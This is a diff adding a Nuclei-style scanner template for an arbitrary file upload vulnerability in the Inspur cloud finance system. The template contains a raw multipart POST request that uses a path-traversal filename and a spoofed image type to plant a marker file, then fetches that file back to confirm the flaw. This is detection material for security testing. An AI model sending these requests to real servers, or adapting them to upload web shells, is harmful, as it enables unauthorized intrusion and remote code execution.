@@ -1,0 +1,41 @@
+id: inspur-gs-UploadListFile-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 浪潮云财务系统UploadListFile存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。
+  reference:
+    - https://github.com/wy876/POC/blob/2fdfb36b6f8f039319461fd394e980d959ca062e/%E6%B5%AA%E6%BD%AE%E4%BA%91/%E6%B5%AA%E6%BD%AE%E4%BA%91%E8%B4%A2%E5%8A%A1%E7%B3%BB%E7%BB%9FUploadListFile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |-
+        POST /cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
+        Accept: /
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+        Content-Type: multipart/form-data; boundary=---------------------------rww5upkbw6ctf0tu5hye
+        Content-Length: 217
+
+        -----------------------------rww5upkbw6ctf0tu5hye
+        Content-Disposition: form-data; name="file"; filename="../../../../../../{{filename}}.txt"
+        Content-Type: image/png
+
+        whoisceshi
+        -----------------------------rww5upkbw6ctf0tu5hye--
+      - |+
+        GET /cwbase/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - whoisceshi
+#.aspx
